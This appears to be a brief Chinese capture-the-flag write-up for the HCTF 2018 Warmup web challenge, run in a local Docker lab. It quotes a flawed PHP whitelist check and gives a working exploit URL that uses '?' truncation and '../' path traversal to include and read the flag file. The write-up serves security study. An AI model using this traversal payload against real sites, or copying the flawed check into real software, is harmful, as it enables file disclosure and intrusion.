---
title: HCTF 2018 Warmup
toc: true
date: 2019-05-01 04:08:06
categories: HCTF
tags:
  - php
  - source code
  - lfi
---

# HCTF 2018 Warmup

## 题目详情

* HCTF 2018 Web 签到题

## 考点
* 代码审计
```php

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```

## 启动
* docker-compose up -d
* open http://127.0.0.1:8081/index.php

## Writeup
![20181113154210017010415.png](http://image.cocoli.top/20181113154210017010415.png)
`http://127.0.0.1:8081/index.php?file=hint.php?/../../../../../../../../ffffllllaaaagggg`
可以利用?截取hint.php，然后利用/使hint.php?成为一个不存在的目录，最后include利用../../跳转目录读取flag

## 版权
该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（ cocolizdf@gmail.com）

凭印象弄的,稍微有一些改变,题目考点不变.
官方题目代码https://github.com/vidar-team/HCTF2018






